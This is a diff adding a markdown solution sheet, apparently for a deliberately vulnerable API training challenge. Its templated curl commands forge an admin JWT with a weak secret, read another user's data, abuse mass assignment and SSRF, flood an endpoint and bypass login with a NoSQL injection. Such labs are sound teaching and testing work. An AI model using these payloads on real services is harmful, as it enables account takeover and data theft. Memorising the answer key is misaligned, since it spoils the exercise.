@@ -1,0 +1,80 @@
+#
+
+Register new user:
+
+
+```
+curl -v -X POST  -H 'content-type: application/json' --data-binary '{"username":"@@USER@@","password":"@@USER@@"}' -L @@ROOT@@/api/register
+```
+
+
+## 0xa1
+
+```
+curl -H 'authorization: Bearer @@JWT@@'  '@@ROOT@@/api/getNote?username=admin'
+```
+
+
+## 0xa2
+
+Create JWT with admin permissions
+
+```
+jwt encode --secret secret123 '{"iat":@@IAT@@,"isAdmin":"true","userId":"@@ID@@","username":"@@USER@@"}'
+```
+
+Get profile:
+
+```
+curl -v -H 'authorization: Bearer @@ADMIN_JWT@@'  @@ROOT@@/api/profile
+```
+
+## 0xa3
+
+```
+curl -v -X POST  -H 'content-type: application/json' --data-binary '{"username":"john","password":"doe","score":12345}' @@ROOT@@/api/register
+```
+
+
+## 0xa4
+
+```
+curl -v -H 'authorization: Bearer @@JWT@@'  -X POST -F "file=@./large-picture.jpg"  @@ROOT@@/api/profile/upload
+```
+
+## 0xa5
+
+```
+curl -v -H 'authorization: Bearer @@JWT@@'  -X DELETE @@ROOT@@/api/user/john
+```
+
+## 0xa6
+
+```
+curl -X POST -H 'authorization: Bearer @@JWT@@' -H 'content-type: application/json' --data-binary '{"url":"http://127.0.0.1:8443"}'  @@ROOT@@/api/AddNoteWithLink
+```
+
+
+## 0xa7
+
+```
+curl -v -H 'authorization: Bearer Invalid=-JWT'  -X GET @@ROOT@@/api/user/john
+```
+
+## 0xa8
+
+```
+for in in $(seq 161); do curl -s  -H 'authorization: Bearer @@JWT@@' -X POST -H 'content-type: application/json' --data-binary '{"message": "test"}' @@ROOT@@/api/addTicket; echo; done
+```
+
+## 0xa9
+
+```
+curl -s  -H 'authorization: Bearer @@JWT@@' -X POST -H 'content-type: application/json' --data-binary '{"unreleased": 1}' @@ROOT@@/api/allChallenges | jq
+```
+
+## 0x10
+
+curl -X POST -H 'content-type: application/json' --data-binary '{"username":"admin","password":{"$ne":null}}' @@ROOT@@/api/login
+
+
